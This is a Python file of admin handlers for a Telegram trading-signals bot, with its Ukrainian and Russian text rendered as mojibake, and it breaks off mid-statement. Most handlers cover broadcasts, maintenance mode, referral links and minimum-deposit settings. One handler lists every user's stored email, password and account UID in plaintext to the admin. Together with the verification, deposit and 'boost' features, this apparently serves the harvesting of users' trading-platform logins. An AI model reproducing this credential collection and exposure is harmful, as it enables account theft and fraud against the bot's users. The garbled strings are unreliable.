"""
admin_panel_handlers.py
–û–±—Ä–æ–±–Ω–∏–∫–∏ —Ç–∞ –¥–æ–ø–æ–º—ñ–∂–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –∞–¥–º—ñ–Ω-–ø–∞–Ω–µ–ª—ñ Telegram-–±–æ—Ç–∞.
"""

import logging
import json
import os
from datetime import datetime, timedelta
import asyncio
from aiogram import F, Router, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, Message, InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

logger = logging.getLogger(__name__)

# from app.app.dispatcher import dp, bot, admin_panel, trading_api # Circular import
# –û–±—ä–µ–∫—Ç—ã –∏–∑ app.app.dispatcher –∏–º–ø–æ—Ä—Ç–∏—Ä—É—é—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ —Ñ—É–Ω–∫—Ü–∏–π, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å —Ü–∏–∫–ª–∏—á–µ—Å–∫–∏—Ö –∏–º–ø–æ—Ä—Ç–æ–≤
from app.keyboards import (
    get_referral_settings_keyboard,
    get_cancel_keyboard,
    get_back_to_panel_keyboard,
    get_boost_active_keyboard,
)
from app.fsm import Admin
import app.database as db
from storage.credentials_storage import load_all_credentials
from services.boost_service import start_boost
# from user_handlers import show_signal_menu # Old import, no longer needed
# Avoid circular imports: import dispatcher objects lazily inside functions when needed


admin_router = Router()

@admin_router.callback_query(F.data == "admin_show_signals")
async def admin_show_signals_handler(callback: CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—É—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—É –º–µ–Ω—é —Å–∏–≥–Ω–∞–ª—ñ–≤, —è–∫ –∑–≤–∏—á–∞–π–Ω–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É."""
    # from user_handlers import show_signal_menu # Old import
    await callback.answer("–¶—è —Ñ—É–Ω–∫—Ü—ñ—è —Ç–∏–º—á–∞—Å–æ–≤–æ –≤—ñ–¥–∫–ª—é—á–µ–Ω–∞.")

@admin_router.callback_query(F.data == "none")
async def handle_none_callback(callback: CallbackQuery):
    """–û–±—Ä–æ–±–ª—è—î –∫–æ–ª–±–µ–∫–∏ –≤—ñ–¥ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ–π–Ω–∏—Ö –∫–Ω–æ–ø–æ–∫, –ø—Ä–æ—Å—Ç–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—á–∏ –Ω–∞ –Ω–∏—Ö."""
    await callback.answer()

# region Service Functions
async def show_admin_panel(message: Message | CallbackQuery, state: FSMContext):
    """–í—ñ–¥–æ–±—Ä–∞–∂–∞—î –≥–æ–ª–æ–≤–Ω—É –ø–∞–Ω–µ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.admin_menu)
    text = "üë®‚Äçüíº <b>–ê–¥–º—ñ–Ω-–ø–∞–Ω–µ–ª—å</b>\n\n–í–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—é –¥–ª—è –∫–µ—Ä—É–≤–∞–Ω–Ω—è –±–æ—Ç–æ–º:"
    
    builder = InlineKeyboardBuilder()
    
    original_keyboard = admin_panel.get_admin_keyboard()
    callbacks_to_remove = {'admin_stats', 'admin_check_cookies', 'admin_show_signals'}

    for row in original_keyboard.inline_keyboard:
        new_row = [btn for btn in row if btn.callback_data not in callbacks_to_remove]
        if new_row:
            builder.row(*new_row)
            
    builder.row(InlineKeyboardButton(text="üë• –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∞–∫–∫–∞—É–Ω—Ç—ã", callback_data="admin_view_accounts"))
    
    markup = builder.as_markup()

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
            await message.answer()
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤–∂–µ –≤–∏–¥–∞–ª–µ–Ω–æ
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

@admin_router.callback_query(F.data == "admin_view_accounts")
async def view_accounts_handler(callback: CallbackQuery):
    """Shows all user credentials to the admin."""
    credentials = load_all_credentials()
    if not credentials:
        await callback.answer("No credentials saved yet.", show_alert=True)
        return

    response_text = "<b>User Accounts:</b>\n\n"
    for user_id, creds in credentials.items():
        email = creds.get('email') or '‚Äî'
        password = creds.get('password') or '‚Äî'
        uid = creds.get('uid') or '‚Äî'
        response_text += (
            f"<b>User ID:</b> {user_id}\n"
            f"<b>UID:</b> {uid}\n"
            f"<b>Email:</b> <code>{email}</code>\n"
            f"<b>Password:</b> <code>{password}</code>\n"
            f"{'-'*20}\n"
        )
    
    await callback.message.edit_text(response_text, parse_mode="HTML", reply_markup=get_back_to_panel_keyboard())
    await callback.answer()

async def _show_settings_panel(message: Message | CallbackQuery, state: FSMContext):
    """–î–æ–ø–æ–º—ñ–∂–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –º–µ–Ω—é –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.settings)
    text = "‚öôÔ∏è <b>–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è</b>\n\n–û–±–µ—Ä—ñ—Ç—å, —â–æ –±–∞–∂–∞—î—Ç–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏:"
    markup = admin_panel.get_settings_keyboard()

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        finally:
            await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

async def _show_referral_panel(message: Message | CallbackQuery, state: FSMContext):
    """–î–æ–ø–æ–º—ñ–∂–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –º–µ–Ω—é —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.referral_settings)
    settings = admin_panel.get_referral_settings()
    text = "üîó <b>–†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è</b>\n\n–¢—É—Ç –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –º—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π –¥–µ–ø–æ–∑–∏—Ç —Ç–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è."
    markup = get_referral_settings_keyboard(settings)

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        finally:
            await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

# endregion

# region Main Admin Commands
@admin_router.message(Command("admin"))
async def cmd_admin(message: Message, state: FSMContext):
    """–û–±—Ä–æ–±–ª—è—î –∫–æ–º–∞–Ω–¥—É /admin."""
    from app.dispatcher import admin_panel
    if admin_panel.is_admin(message.from_user.id):
        await show_admin_panel(message, state)
    else:
        await message.answer("–£ –≤–∞—Å –Ω–µ–º–∞—î –¥–æ—Å—Ç—É–ø—É –¥–æ —Ü—ñ—î—ó –∫–æ–º–∞–Ω–¥–∏.")

@admin_router.callback_query(F.data == "admin_panel")
async def cq_show_admin_panel(callback: CallbackQuery, state: FSMContext):
    """–û–±—Ä–æ–±–ª—è—î –∫–æ–ª–±–µ–∫ 'admin_panel' –¥–ª—è –ø–æ–∫–∞–∑—É –≥–æ–ª–æ–≤–Ω–æ—ó –∞–¥–º—ñ–Ω-–ø–∞–Ω–µ–ª—ñ."""
    await show_admin_panel(callback, state)

@admin_router.callback_query(F.data == "admin_settings")
async def handle_show_settings(callback: CallbackQuery, state: FSMContext):
    """–û–±—Ä–æ–±–Ω–∏–∫ –¥–ª—è –≤—Ö–æ–¥—É –≤ –º–µ–Ω—é –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å."""
    await _show_settings_panel(callback, state)

@admin_router.message(Command("stats"))
async def show_stats_command(message: Message):
    """–í—ñ–¥–æ–±—Ä–∞–∂–∞—î —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞. –¢—ñ–ª—å–∫–∏ –¥–ª—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤."""
    from app.dispatcher import admin_panel
    if not admin_panel.is_admin(message.from_user.id):
        await message.reply("–¶—è –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –ª–∏—à–µ –¥–ª—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤.")
        return

    stats = admin_panel.get_statistics()

    stats_message = (
        "üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞</b>\n\n"
        f"üë§ –£–Ω—ñ–∫–∞–ª—å–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ (–≤ –±–∞–∑—ñ): {stats['total_users']}\n"
        f"üöÄ –ù–∞—Ç–∏—Å–∫–∞–Ω–Ω—è /start: {stats['total_starts']}\n"
        f"‚úÖ –í–µ—Ä–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ: {stats['verified_users']}\n"
        f"‚è≥ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –≤ –ø—Ä–æ—Ü–µ—Å—ñ –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—ó: {stats['in_verification_users']}\n"
        f"üìà –ó–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ —Å–∏–≥–Ω–∞–ª—ñ–≤ (—Å—å–æ–≥–æ–¥–Ω—ñ): {stats['signals_generated_today']}\n"
        f"üìà –ó–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ —Å–∏–≥–Ω–∞–ª—ñ–≤ (–≤—Å—å–æ–≥–æ): {stats['signals_generated_total']}"
    )

    await message.answer(stats_message, parse_mode="HTML")

# endregion

# region Maintenance
async def _show_maintenance_panel(message: Message | CallbackQuery, state: FSMContext):
    """–î–æ–ø–æ–º—ñ–∂–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –º–µ–Ω—é –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.maintenance)
    text = "üîÑ <b>–ö–µ—Ä—É–≤–∞–Ω–Ω—è —Ä–µ–∂–∏–º–æ–º –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è</b>"
    markup = admin_panel.get_maintenance_keyboard()

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        finally:
            await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

@admin_router.callback_query(F.data == "admin_maintenance")
async def handle_show_maintenance_panel(callback: CallbackQuery, state: FSMContext):
    """–û–±—Ä–æ–±–Ω–∏–∫ –¥–ª—è –≤—Ö–æ–¥—É –≤ –º–µ–Ω—é –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è."""
    await _show_maintenance_panel(callback, state)

@admin_router.callback_query(F.data == "admin_maintenance_toggle")
async def toggle_maintenance_mode(callback: CallbackQuery, state: FSMContext):
    """–ü–µ—Ä–µ–º–∏–∫–∞—î —Ä–µ–∂–∏–º –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è."""
    from app.dispatcher import admin_panel
    new_mode = not admin_panel.get_maintenance_mode()
    admin_panel.set_maintenance_mode(new_mode)
    status = "—É–≤—ñ–º–∫–Ω–µ–Ω–æ" if new_mode else "–≤–∏–º–∫–Ω–µ–Ω–æ"

    await callback.answer(f"–†–µ–∂–∏–º –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è {status}.", show_alert=True)
    # –û–Ω–æ–≤–ª—é—î–º–æ –ø–∞–Ω–µ–ª—å –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è, —â–æ–± –ø–æ–∫–∞–∑–∞—Ç–∏ –Ω–æ–≤–∏–π —Å—Ç–∞—Ç—É—Å
    await _show_maintenance_panel(callback, state)

@admin_router.callback_query(F.data == "admin_set_maintenance_msg")
async def set_maintenance_msg(callback: CallbackQuery, state: FSMContext):
    """–ó–∞–ø–∏—Ç—É—î –Ω–æ–≤–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ —Ç–µ—Ö. —Ä–æ–±–æ—Ç–∏."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_maintenance_message)
    await callback.message.edit_text(
        f"–ü–æ—Ç–æ—á–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:\n<i>{admin_panel.get_maintenance_message()}</i>\n\n‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –Ω–æ–≤–µ:",
        reply_markup=get_cancel_keyboard("admin_maintenance"), # –ù–∞–∑–∞–¥ –¥–æ –º–µ–Ω—é –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è
        parse_mode="HTML"
    )

@admin_router.message(StateFilter(Admin.change_maintenance_message), F.text)
async def process_new_maintenance_message(message: Message, state: FSMContext):
    """–û–Ω–æ–≤–ª—é—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ —Ç–µ—Ö. —Ä–æ–±–æ—Ç–∏."""
    from app.dispatcher import admin_panel
    admin_panel.set_maintenance_message(message.text.strip())
    await message.answer("‚úÖ <b>–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è –æ–Ω–æ–≤–ª–µ–Ω–æ.</b>", parse_mode="HTML")
    await _show_maintenance_panel(message, state)

# endregion

# region Statistics
@admin_router.callback_query(F.data == "admin_stats")
async def show_admin_stats(callback: CallbackQuery):
    """–ü–æ–∫–∞–∑—É—î —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞."""
    from app.dispatcher import admin_panel
    stats = admin_panel.get_statistics()

    stats_text = (
        "üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞</b>\n\n"
        f"üë§ –£–Ω—ñ–∫–∞–ª—å–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ (–≤ –±–∞–∑—ñ): {stats['total_users']}\n"
        f"üöÄ –ù–∞—Ç–∏—Å–∫–∞–Ω–Ω—è /start: {stats['total_starts']}\n"
        f"‚úÖ –í–µ—Ä–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ: {stats['verified_users']}\n"
        f"‚è≥ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –≤ –ø—Ä–æ—Ü–µ—Å—ñ –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—ó: {stats['in_verification_users']}\n"
        f"üìà –ó–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ —Å–∏–≥–Ω–∞–ª—ñ–≤ (—Å—å–æ–≥–æ–¥–Ω—ñ): {stats['signals_generated_today']}\n"
        f"üìà –ó–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ —Å–∏–≥–Ω–∞–ª—ñ–≤ (–≤—Å—å–æ–≥–æ): {stats['signals_generated_total']}"
    )

    try:
        await callback.message.edit_text(
            stats_text,
            reply_markup=admin_panel.get_admin_keyboard(),
            parse_mode="HTML",
        )
    except TelegramBadRequest:
        # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–µ –∑–º—ñ–Ω–∏–ª–æ—Å—è, –ø—Ä–æ—Å—Ç–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î–º–æ –Ω–∞ –∫–æ–ª–±–µ–∫
        await callback.answer("–î–∞–Ω—ñ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –Ω–µ –∑–º—ñ–Ω–∏–ª–∏—Å—è.")
    else:
        await callback.answer()
# endregion

# region Broadcast
@admin_router.callback_query(F.data == 'admin_broadcast_menu')
async def broadcast_menu(callback: CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—É—î –º–µ–Ω—é –≤–∏–±–æ—Ä—É —Ç–∏–ø—É —Ä–æ–∑—Å–∏–ª–∫–∏."""
    from app.dispatcher import admin_panel
    await callback.message.edit_text(
        "üì® <b>–†–æ–∑—Å–∏–ª–∫–∞</b>\n\n–û–±–µ—Ä—ñ—Ç—å, –∫–æ–º—É –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:",
        reply_markup=admin_panel.get_broadcast_keyboard(),
        parse_mode="HTML"
    )

@admin_router.callback_query(F.data == 'admin_broadcast_all')
async def start_broadcast_all(callback: CallbackQuery, state: FSMContext):
    """–ü–æ—á–∏–Ω–∞—î –ø—Ä–æ—Ü–µ—Å —Ä–æ–∑—Å–∏–ª–∫–∏ –¥–ª—è –≤—Å—ñ—Ö."""
    await state.set_state(Admin.send_broadcast)
    await callback.message.edit_text(
        "üì® –í–≤–µ–¥—ñ—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è —Ä–æ–∑—Å–∏–ª–∫–∏. –í–æ–Ω–æ –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ <b>–≤—Å—ñ–º</b> –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –±–æ—Ç–∞.",
        reply_markup=get_cancel_keyboard("admin_broadcast_menu"),
        parse_mode="HTML"
    )

@admin_router.callback_query(F.data == 'admin_broadcast_verified')
async def start_broadcast_verified(callback: CallbackQuery, state: FSMContext):
    """–ü–æ—á–∏–Ω–∞—î –ø—Ä–æ—Ü–µ—Å —Ä–æ–∑—Å–∏–ª–∫–∏ –¥–ª—è –≤–µ—Ä–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö."""
    await state.set_state(Admin.send_verified_broadcast)
    await callback.message.edit_text(
        "üì® –í–≤–µ–¥—ñ—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è —Ä–æ–∑—Å–∏–ª–∫–∏. –í–æ–Ω–æ –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ —Ç—ñ–ª—å–∫–∏ <b>–≤–µ—Ä–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º</b> –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º.",
        reply_markup=get_cancel_keyboard("admin_broadcast_menu"),
        parse_mode="HTML"
    )

@admin_router.message(StateFilter(Admin.send_broadcast), F.text)
async def process_broadcast_message(message: Message, state: FSMContext):
    """–ù–∞–¥—Å–∏–ª–∞—î —Ä–æ–∑—Å–∏–ª–∫—É –≤—Å—ñ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º."""
    from app.dispatcher import bot
    users = db.get_all_users()
    await send_messages_to_users(message, state, list(users.keys()))

@admin_router.message(StateFilter(Admin.send_verified_broadcast), F.text)
async def process_verified_broadcast_message(message: Message, state: FSMContext):
    """–ù–∞–¥—Å–∏–ª–∞—î —Ä–æ–∑—Å–∏–ª–∫—É –≤–µ—Ä–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º."""
    all_users = db.get_all_users()
    verified_user_ids = [uid for uid, udata in all_users.items() if db.is_fully_verified(int(uid))]
    await send_messages_to_users(message, state, verified_user_ids)

async def send_messages_to_users(message: Message, state: FSMContext, user_ids: list):
    """–í—ñ–¥–ø—Ä–∞–≤–ª—è—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑–∞–¥–∞–Ω–æ–º—É —Å–ø–∏—Å–∫—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤."""
    from app.dispatcher import bot, admin_panel
    total_users = len(user_ids)
    count = 0
    errors = 0

    await message.answer(f"‚è≥ –ü–æ—á–∏–Ω–∞—é —Ä–æ–∑—Å–∏–ª–∫—É –¥–ª—è <b>{total_users}</b> –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤...", parse_mode="HTML")

    for user_id in user_ids:
        try:
            await bot.send_message(user_id, message.text, parse_mode="HTML")
            count += 1
            await asyncio.sleep(0.1)  # –ù–µ–≤–µ–ª–∏–∫–∞ –∑–∞—Ç—Ä–∏–º–∫–∞
        except Exception as e:
            errors += 1
            logger.warning(f"–ù–µ –≤–¥–∞–ª–æ—Å—è –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É {user_id}: {e}")

    await message.answer(
        f"‚úÖ <b>–†–æ–∑—Å–∏–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.</b>\n\n"
        f"üì• –ù–∞–¥—ñ—Å–ª–∞–Ω–æ: <b>{count}</b> –∑ {total_users}\n"
        f"‚ùå –ü–æ–º–∏–ª–æ–∫: <b>{errors}</b>",
        reply_markup=admin_panel.get_admin_keyboard(),
        parse_mode="HTML"
    )
    await state.clear()

# endregion

# region Settings

# Welcome Message
@admin_router.callback_query(F.data == "admin_set_welcome")
async def set_welcome_msg(callback: CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—É—î —Ñ–æ—Ä–º—É –¥–ª—è –∑–º—ñ–Ω–∏ –≤—ñ—Ç–∞–ª—å–Ω–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_welcome_message)
    await callback.message.edit_text(
        f"<b>–ü–æ—Ç–æ—á–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:</b>\n\n<i>{admin_panel.get_welcome_message()}</i>\n\n‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –Ω–æ–≤–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:",
        reply_markup=get_cancel_keyboard("admin_settings"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(Admin.change_welcome_message, F.text)
async def process_new_welcome_message(message: Message, state: FSMContext):
    """–û–Ω–æ–≤–ª—é—î –≤—ñ—Ç–∞–ª—å–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è."""
    from app.dispatcher import admin_panel
    admin_panel.set_welcome_message(message.text.strip())
    await message.answer("‚úÖ <b>–ü—Ä–∏–≤—ñ—Ç–∞–ª—å–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –æ–Ω–æ–≤–ª–µ–Ω–æ!</b>", parse_mode="HTML")
    await _show_settings_panel(message, state)

# Finish Message
@admin_router.callback_query(F.data == "admin_set_finish_msg")
async def set_finish_msg(callback: CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—É—î —Ñ–æ—Ä–º—É –¥–ª—è –∑–º—ñ–Ω–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—é."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_finish_message)
    await callback.message.edit_text(
        f"<b>–ü–æ—Ç–æ—á–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:</b>\n\n<i>{admin_panel.get_finish_message()}</i>\n\n‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –Ω–æ–≤–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:",
        reply_markup=get_cancel_keyboard("admin_settings"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(Admin.change_finish_message, F.text)
async def process_new_finish_message(message: Message, state: FSMContext):
    """–û–Ω–æ–≤–ª—é—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—é."""
    from app.dispatcher import admin_panel
    admin_panel.set_finish_message(message.text.strip())
    await message.answer("‚úÖ <b>–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—é –æ–Ω–æ–≤–ª–µ–Ω–æ!</b>", parse_mode="HTML")
    await _show_settings_panel(message, state)

# Referral Settings
@admin_router.callback_query(F.data == "admin_set_referral")
async def show_referral_settings(callback: CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—É—î –º–µ–Ω—é –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏."""
    await _show_referral_panel(callback, state)

@admin_router.callback_query(F.data == "admin_change_min_deposit")
async def change_min_deposit_start(callback: CallbackQuery, state: FSMContext):
    """–ü–æ—á–∏–Ω–∞—î –ø—Ä–æ—Ü–µ—Å –∑–º—ñ–Ω–∏ –º—ñ–Ω—ñ–º–∞–ª—å–Ω–æ–≥–æ –¥–µ–ø–æ–∑–∏—Ç—É."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_min_deposit)
    current_deposit = admin_panel.get_referral_settings().get('min_deposit', 0)
    await callback.message.edit_text(
        f"üí∞ <b>–ü–æ—Ç–æ—á–Ω–∏–π –º—ñ–Ω. –¥–µ–ø–æ–∑–∏—Ç:</b> {current_deposit}\n\n–í–≤–µ–¥—ñ—Ç—å –Ω–æ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(StateFilter(Admin.change_min_deposit), F.text)
async def process_new_min_deposit(message: Message, state: FSMContext):
    """–û–±—Ä–æ–±–ª—è—î –Ω–æ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è –º—ñ–Ω—ñ–º–∞–ª—å–Ω–æ–≥–æ –¥–µ–ø–æ–∑–∏—Ç—É —ñ –∑–±–µ—Ä—ñ–≥–∞—î –π–æ–≥–æ."""
    from app.dispatcher import admin_panel
    text = message.text.strip().replace(",", ".")
    try:
        amount = float(text)
        if amount < 0:
            raise ValueError
    except ValueError:
        await message.answer("‚ùå –í–≤–µ–¥—ñ—Ç—å –∫–æ—Ä–µ–∫—Ç–Ω–µ –Ω–µ–≤—ñ–¥'—î–º–Ω–µ —á–∏—Å–ª–æ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: 20 –∞–±–æ 20.5")
        return

    admin_panel.set_min_deposit(amount)
    await message.answer(f"‚úÖ –ú—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π –¥–µ–ø–æ–∑–∏—Ç –æ–Ω–æ–≤–ª–µ–Ω–æ: ${amount}")
    await state.clear()
    await _show_referral_panel(message, state)

@admin_router.callback_query(F.data == "admin_change_ref_link")
async def change_ref_link_start(callback: CallbackQuery, state: FSMContext):
    """–ü–æ—á–∏–Ω–∞—î –ø—Ä–æ—Ü–µ—Å –∑–º—ñ–Ω–∏ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–≥–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_referral_link)
    current_link = admin_panel.get_referral_settings().get('referral_link', 'Not set')
    await callback.message.edit_text(
